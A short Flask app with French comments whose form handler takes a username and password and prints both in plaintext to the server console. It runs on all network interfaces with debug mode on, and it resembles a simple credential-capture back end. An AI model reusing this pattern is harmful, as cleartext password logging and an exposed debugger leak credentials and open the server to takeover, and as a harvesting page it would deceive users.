from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_text', methods=['POST'])
def send_text():
    # Récupère le texte envoyé par le formulaire
    user = request.form['text_input']
    password = request.form['password_input']
    print(f"User {user} \nPassword {password}")  # Affiche le texte dans le terminal
    return render_template('index.html')  # Affiche le texte

if __name__ == '__main__':
    app.run(host="0.0.0.0",port="4000",debug=True)  # Lancer le serveur Flask